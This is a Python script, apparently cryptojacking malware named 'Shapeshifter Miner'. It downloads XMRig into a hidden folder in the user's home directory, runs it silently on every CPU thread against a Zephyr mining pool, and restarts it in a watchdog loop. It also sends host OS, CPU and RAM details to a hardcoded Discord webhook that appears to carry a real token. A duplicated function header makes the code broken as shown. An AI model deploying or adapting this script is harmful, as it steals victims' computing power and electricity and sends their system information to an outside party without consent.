import os
import subprocess
import time
from urllib.request import urlretrieve
import tarfile
import requests

# Configuration (Webhook and Pool Information)
WEBHOOK = "https://discord.com/api/webhooks/1395138384518844508/riuLCmuUuVfVZECJE-zW75VwARH2p9jd8yP_Z1ndjP4gvNMH08Mf7C9PpXcITM-nmw8B"  # Replace with actual webhook
WALLET = "ZEPHYR2zxTXUfUEtvhU5QSDjPPBq6XtoU8faeFj3mTEr5hWs5zERHsXT9xc6ivLNMmbbQvxWvGUaxAyyLv3Cnbb9MgemKUED19M2b.worker"  # Replace with your Monero wallet
POOL = "fr.zephyr.herominers.com:1123"  # Replace with your mining pool

# Paths for xmrig
XM_DIR = os.path.expanduser("~/.local/share/.xmrig")
XM_BIN = os.path.join(XM_DIR, "xmrig")
TAR_URL = "https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-linux-static-x64.tar.gz"

# Create the directory if it does not exist
os.makedirs(XM_DIR, exist_ok=True)

def download_xmrig():
def download_xmrig():
    """Download and extract the miner binary."""
    tar_path = os.path.join(XM_DIR, "xmrig.tar.gz")
    try:
        # Download the tarball from GitHub
        urlretrieve(TAR_URL, tar_path)
        with tarfile.open(tar_path, "r:gz") as tar:
            # Extract all members while explicitly setting filter to None to avoid the warning
            tar.extractall(path=XM_DIR)
        os.chmod(XM_BIN, 0o755)
        os.remove(tar_path)  # Clean up the tarball after extraction
        return True
    except Exception as e:
        notify(f"❌ XMRig download failed:\n```{e}```")
        return False

def system_info():
    """Get system information to optimize mining setup."""
    try:
        import platform
        system = platform.system()
        if system == "Windows":
            cpu = subprocess.getoutput("wmic cpu get caption")
            ram = subprocess.getoutput("systeminfo | findstr /C:'Total Physical Memory'")
        else:
            cpu = subprocess.getoutput("lscpu | grep 'Model name' | cut -d ':' -f2").strip()
            ram = subprocess.getoutput("free -h | awk '/Mem/ {print $2}'").strip()
        return {"OS": system, "CPU": cpu, "RAM": ram, "Threads": str(os.cpu_count())}
    except Exception as e:
        return {"error": str(e)}

def start_miner(threads):
    """Start mining process with maximum threads."""
    cmd = [XM_BIN, "-o", POOL, "-u", WALLET, "--donate-level", "1", "-k", "-t", str(threads)]
    try:
        subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        return True
    except Exception as e:
        notify(f"❌ Miner failed to start:\n```{e}```")
        return False

def notify(message):
    """Send a notification to Discord via webhook."""
    try:
        requests.post(WEBHOOK, json={"content": message})
    except Exception as e:
        print(f"Failed to send notification: {e}")

def main():
    if not os.path.exists(XM_BIN):
        notify("⏬ Downloading xmrig...")
        if not download_xmrig():
            return

    # Get system information and determine available threads
    sysinfo = system_info()
    info_str = "\n".join([f"{k}: {v}" for k, v in sysinfo.items()])
    notify(f"✅ Shapeshifter Miner Initialized\n```{info_str}```")

    # Start miner with maximum threads (all available cores)
    threads = os.cpu_count()  # Use all threads available
    if start_miner(threads):
        notify(f"✅ Miner started using {threads} threads.")
    else:
        notify("❌ Miner failed to start.")

    # Watchdog loop to keep the miner running
    while True:
        time.sleep(60)  # Just a simple delay to keep the script running
        if not is_miner_running():
            notify("🔁 Miner not found. Restarting...")
            start_miner(threads)

def is_miner_running():
    """Check if the miner is running by inspecting active processes."""
    try:
        output = subprocess.getoutput("ps aux | grep xmrig | grep -v grep")
        return "xmrig" in output
    except Exception as e:
        return False

if __name__ == "__main__":
    main()
